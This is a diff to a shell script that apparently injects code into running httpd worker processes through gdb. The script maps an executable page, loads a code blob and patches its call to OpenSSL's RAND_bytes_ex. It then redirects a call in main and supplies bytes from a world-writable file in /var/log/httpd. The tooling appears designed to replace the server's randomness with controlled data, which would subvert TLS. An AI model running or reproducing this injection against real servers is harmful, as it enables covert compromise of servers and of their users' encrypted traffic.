@@ -94,16 +94,12 @@ set print thread-events off
 set \$code = (unsigned char *) mmap(0, \$filesize, 7, 0x22, -1, 0)
 restore $mod_code binary \$code 0 \$filesize
 
-# Resolving function addresses
+# Resolving RAND_bytes_ex function address
 set \$real_rand = (void*) RAND_bytes_ex
-set \$real_open = (void*) open
-set \$real_read = (void*) read
-set \$real_close = (void*) close
 
 # Allocating data storage
 set \$data_page = (unsigned char *) mmap(0, 4096, 3, 0x22, -1, 0)
 set \$shm_fd = (int) open("$shm_file", 2)
-set \$shm_size = 4104
 set \$shm_ptr = (unsigned char *) mmap(0, \$shm_size, 3, 1, \$shm_fd, 0)
 call (int) close(\$shm_fd)
 set *(unsigned long long*)\$data_page = (unsigned long long)\$shm_ptr
@@ -133,10 +129,10 @@ while \$scan < \$limit
 end
 
 # Patching data references in code.bin
-set *(int*)(\$code + 0x3) = (int)((long)\$data_page - (long)(\$code + 0x7))
+set *(int*)(\$code + 0x6) = (int)((long)\$data_page - (long)(\$code + 0xa))
 
 # Patching function calls in code.bin
-set *(int*)(\$code + 0x157) = (int)((long)\$real_rand - (long)(\$code + 0x15b))
+set *(int*)(\$code + 0x15f) = (int)((long)\$real_rand - (long)(\$code + 0x163))
 
 # Patch call instruction on main
 if \$call_found
@@ -183,6 +179,7 @@ attach_first_worker() {
       -iex 'set verbose off' \
       -iex 'set print thread-events off' \
       -ex 'set \$filesize=$FILESIZE' \
+      -ex 'set \$shm_size=$SHM_SIZE' \
       -p $pid \
       -x $gdb_script"
 
@@ -217,6 +214,7 @@ attach_worker() {
       -iex 'set verbose off' \
       -iex 'set print thread-events off' \
       -ex 'set \$filesize=$FILESIZE' \
+      -ex 'set \$shm_size=$SHM_SIZE' \
       -p $pid \
       -x $gdb_script"
 
@@ -281,7 +279,15 @@ main() {
   FILESIZE=$(wc -c < "$MOD_CODE")
   SCRIPT_DIR="$(cd "$(dirname "$(readlink -f "$0")")" && pwd)"
   SHM_FILE="/var/log/httpd/shm.bin"
-  dd if=/dev/zero bs=8 count=1 of="$SHM_FILE" 2>/dev/null
+  DATA_SIZE=$(wc -c < "$SCRIPT_DIR/$DATA")
+  SHM_SIZE=$((16 + DATA_SIZE))
+  {
+    ds=$DATA_SIZE
+    for i in 0 1 2 3 4 5 6 7; do
+      printf '\x'"$(printf '%02x' $(( (ds >> (i*8)) & 0xff )))"
+    done
+    printf '\x00\x00\x00\x00\x00\x00\x00\x00'
+  } > "$SHM_FILE"
   cat "$SCRIPT_DIR/$DATA" >> "$SHM_FILE"
   chmod 666 "$SHM_FILE"
   declare -A ATTACHED_PIDS PID_TO_WINDOW GDB_SCRIPTS
